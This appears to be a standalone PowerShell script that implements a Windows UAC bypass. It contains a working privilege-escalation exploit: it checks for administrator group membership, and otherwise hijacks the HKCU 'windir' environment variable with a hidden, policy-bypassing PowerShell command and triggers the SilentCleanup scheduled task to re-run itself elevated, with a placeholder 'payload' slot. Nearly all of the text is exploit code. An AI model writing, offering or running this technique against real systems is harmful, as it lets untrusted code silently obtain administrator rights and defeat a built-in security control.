if (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544") {
    # Payload goes here
    # It will run as Administrator
    mkdir C:\Windows\uas-bypass
} else {
    # Open Command Prompt as administrator
    $startInfo = New-Object System.Diagnostics.ProcessStartInfo
    $startInfo.FileName = "cmd.exe"
    $startInfo.Verb = "runas"  # This triggers the 'run as administrator' prompt
    $startInfo.Arguments = "/c echo This will run as admin"
    [System.Diagnostics.Process]::Start($startInfo)
    
    # Optional - You can modify the rest of your script based on education logic or needs
    # You may also want to handle cases when the user declines the 'run as administrator' prompt.
    
    # If you still want to proceed with the registry method as fallback
    $registryPath = "HKCU:\Environment"
    $Name = "windir"
    $Value = "powershell -ep bypass -w h $PSCommandPath;#"
    Set-ItemProperty -Path $registryPath -Name $name -Value $Value

    # Depending on the performance of the machine, some sleep time may be required before or after schtasks
    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
    Remove-ItemProperty -Path $registryPath -Name $name
}
